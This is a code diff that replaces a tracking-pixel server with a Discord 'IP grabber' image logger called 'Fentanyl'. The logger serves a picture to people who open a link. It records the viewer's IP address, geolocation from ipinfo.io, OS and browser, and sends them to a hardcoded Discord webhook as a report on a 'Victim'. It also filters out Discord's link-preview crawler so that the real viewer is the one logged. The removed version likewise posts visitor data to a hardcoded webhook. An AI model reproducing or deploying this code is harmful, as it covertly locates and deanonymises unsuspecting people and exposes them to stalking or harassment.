@@ -1,111 +1,69 @@
-# server.py
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import socketserver
-from datetime import datetime
-import os
-import json
-import requests
-from email.utils import formatdate
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import httpx, base64, httpagentparser
 
-PORT = 8000
-LOG_FILE = "access.log"
-DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1548353585933451325/JGxatJWpqT8ilGi_K2NHWy7-Fw48DA0V1qohAlDO2D7nlVcoNTA3uWNtJIJL_0jrGZ5U")  # Add your Discord webhook URL here
-PIXEL_PATH = "/tracking_pixel.gif"
-PIXEL_DATA = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
+webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
 
-class TrackingHandler(BaseHTTPRequestHandler):
-    def log_access(self):
-        client_ip = self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown')
-        referer = self.headers.get('Referer', 'Direct')
-        timestamp = formatdate(timeval=None, localtime=True, usegmt=True)
-        
-        log_entry = {
-            'timestamp': datetime.now().isoformat(),
-            'ip': client_ip,
-            'user_agent': user_agent,
-            'method': self.command,
-            'path': self.path,
-            'referer': referer
+bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+
+def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
+    return {
+  "username": "Fentanyl",
+  "content": "@everyone",
+  "embeds": [
+    {
+      "title": "Fentanyl strikes again!",
+      "color": 16711803,
+      "description": "A Victim opened the original Image. You can find their info below.",
+      "author": {
+        "name": "Fentanyl"
+      },
+      "fields": [
+        {
+          "name": "IP Info",
+          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
+          "inline": True
+        },
+        {
+          "name": "Advanced Info",
+          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
+          "inline": False
         }
-        
-        print(f"[{timestamp}] {client_ip} - {user_agent[:50]}...")
-        
-        with open(LOG_FILE, "a") as log:
-            log.write(json.dumps(log_entry) + "\n")
-        
-        if PIXEL_PATH in self.path and DISCORD_WEBHOOK:
-            self.send_discord_alert(client_ip, user_agent, referer)
-    
-    def send_discord_alert(self, ip, ua, referer):
-        embed = {
-            "title": "📌 Tracking Pixel Triggered!",
-            "color": 5814783,
-            "fields": [
-                {"name": "Visitor IP", "value": ip, "inline": True},
-                {"name": "User Agent", "value": f"```{ua[:1000]}```", "inline": False},
-                {"name": "Referer", "value": referer, "inline": True}
-            ],
-            "footer": {"text": f"Logged at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
-        }
-        
-        try:
-            requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=5)
-        except Exception as e:
-            print(f"Discord notification failed: {e}")
-    
+      ]
+    }
+  ],
+}
+
+def prev(ip,uag):
+  return {
+  "username": "Fentanyl",
+  "content": "",
+  "embeds": [
+    {
+      "title": "Fentanyl Alert!",
+      "color": 16711803,
+      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "author": {
+        "name": "Fentanyl"
+      },
+      "fields": [
+      ]
+    }
+  ],
+}
+
+class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.log_access()
-        
-        if self.path == PIXEL_PATH:
-            self.send_response(200)
-            self.send_header('Content-type', 'image/gif')
-            self.send_header('Cache-Control', 'no-store, must-revalidate')
-            self.send_header('Expires', '0')
-            self.end_headers()
-            self.wfile.write(PIXEL_DATA)
-            return
-        
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        
-        html_content = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Tracking Server</title>
-            <style>
-                body {{ font-family: sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }}
-                .container {{ background: #f8f9fa; padding: 30px; border-radius: 10px; }}
-                .info {{ background: white; padding: 15px; border-radius: 5px; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🛜 HTTP Tracking Server</h1>
-                <div class="info">
-                    <p>✅ Server is operational</p>
-                    <p>🕒 Time: {datetime.now().strftime('%c')}</p>
-                    <p>📍 Your IP: {self.client_address[0]}</p>
-                    <p>🖥️ User Agent: {self.headers.get('User-Agent', 'Unknown')[:80]}</p>
-                </div>
-                <p>This page contains a tracking pixel that logs accesses.</p>
-                <img src="{PIXEL_PATH}" alt="tracking pixel">
-            </div>
-        </body>
-        </html>
-        """
-        self.wfile.write(html_content.encode('utf-8'))
-
-if __name__ == "__main__":
-    print(f"🚀 Starting tracking server on port {PORT}")
-    print(f"📝 Access log: {os.path.abspath(LOG_FILE)}")
-    print(f"📌 Tracking pixel URL: http://localhost:{PORT}{PIXEL_PATH}")
-    print("🛑 Press CTRL+C to stop the server")
-    
-    with HTTPServer(("", PORT), TrackingHandler) as server:
-        try:
-            server.serve_forever()
-        except KeyboardInterrupt:
-            print("\n🛑 Server stopped by user")
+        s = self.path
+        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
+        except Exception: data = bindata
+        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
+        os, browser = httpagentparser.simple_detect(useragent)
+        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
+            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
+            else: pass
+        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
+        return
